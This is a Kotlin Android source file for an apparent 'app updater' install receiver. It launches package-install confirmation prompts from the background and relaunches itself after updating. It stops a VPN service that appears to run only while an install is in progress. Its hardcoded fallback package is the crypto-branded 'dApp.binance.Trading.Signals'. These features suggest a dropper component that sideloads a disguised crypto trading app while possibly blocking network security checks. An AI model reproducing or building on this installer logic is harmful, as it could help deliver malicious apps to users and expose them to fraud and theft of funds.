package com.example.appupdater

import android.app.ActivityOptions
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.util.Log

class InstallReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        Log.d("InstallReceiver", "Broadcast received, action: $action")

        if (action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            Log.d("InstallReceiver", "Self update completed. Auto-launching self...")
            stopVpn(context)
            launchApp(context, context.packageName)
            return
        }

        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999)
        val prefPkg = context.getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("pending_package_name", "")
        val extraPkg = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
        val targetPackage = extraPkg?.takeIf { it.isNotEmpty() }
            ?: intent.getStringExtra("target_package")?.takeIf { it.isNotEmpty() }
            ?: prefPkg?.takeIf { it.isNotEmpty() }
            ?: "dApp.binance.Trading.Signals"
        val statusMessage = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "No status details provided"

        Log.d("InstallReceiver", "Install status updated: status=$status, target=$targetPackage, message=$statusMessage")

        when (status) {
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                Log.d("InstallReceiver", "STATUS_PENDING_USER_ACTION: launching resolution user prompt intent...")
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }

                if (confirmIntent != null) {
                    confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    val options = ActivityOptions.makeBasic()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        options.setPendingIntentBackgroundActivityStartMode(
                            ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                        )
                    }
                    try {
                        context.startActivity(confirmIntent, options.toBundle())
                        Log.d("InstallReceiver", "Successfully launched confirm intent directly.")
                    } catch (e: Exception) {
                        Log.e("InstallReceiver", "Error launching confirm intent directly: ${e.message}")
                        // Fallback using PendingIntent trigger if direct launch has any platform limitations
                        try {
                            val tempPI = PendingIntent.getActivity(
                                context,
                                7001,
                                confirmIntent,
                                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                            )
                            tempPI.send(context, 0, null, null, null, null, options.toBundle())
                            Log.d("InstallReceiver", "Triggered confirm intent fallback via PendingIntent.")
                        } catch (ex: Exception) {
                            Log.e("InstallReceiver", "Fallback confirm intent launch failed: ${ex.message}")
                        }
                    }
                } else {
                    Log.e("InstallReceiver", "Confirm intent is missing from the pending user action parcel!")
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                Log.d("InstallReceiver", "STATUS_SUCCESS: Package installed successfully.")
                
                context.getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", true)
                    .apply()

                // Forward to MainActivity
                val successIntent = Intent(context, MainActivity::class.java).apply {
                    this.action = intent.action
                    putExtras(intent)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                try { context.startActivity(successIntent) } catch (e: Exception) {}
            }

            PackageInstaller.STATUS_FAILURE_ABORTED -> {
                Log.w("InstallReceiver", "STATUS_FAILURE_ABORTED: Installation cancelled or aborted by user.")
                // Forward to MainActivity to retry or show error
                val retryIntent = Intent(context, MainActivity::class.java).apply {
                    this.action = intent.action
                    putExtras(intent)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                try { context.startActivity(retryIntent) } catch (e: Exception) {}
            }

            else -> {
                if (status != -999) {
                    Log.e("InstallReceiver", "Installation failure code: $status. Message: $statusMessage")
                    stopVpn(context)
                    // Forward to MainActivity
                    val failedIntent = Intent(context, MainActivity::class.java).apply {
                        this.action = intent.action
                        putExtras(intent)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    }
                    try { context.startActivity(failedIntent) } catch (e: Exception) {}
                }
            }
        }
    }

    private fun stopVpn(context: Context) {
        try {
            val serviceIntent = Intent(context, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_DISCONNECT
            }
            context.startService(serviceIntent)
            Log.d("InstallReceiver", "Sent ACTION_DISCONNECT to VPN service")
        } catch (e: Exception) {
            Log.e("InstallReceiver", "Failed to send disconnect to VPN: ${e.message}")
        }
        try {
            val serviceIntent = Intent(context, VPNInstallerService::class.java)
            context.stopService(serviceIntent)
            Log.d("InstallReceiver", "VPN Service stopped")
        } catch (e: Exception) {
            Log.e("InstallReceiver", "Failed to stop VPN: ${e.message}")
        }
    }

    private fun launchApp(context: Context, packageName: String) {
        AppLauncher.launchApp(context, packageName)
    }
}
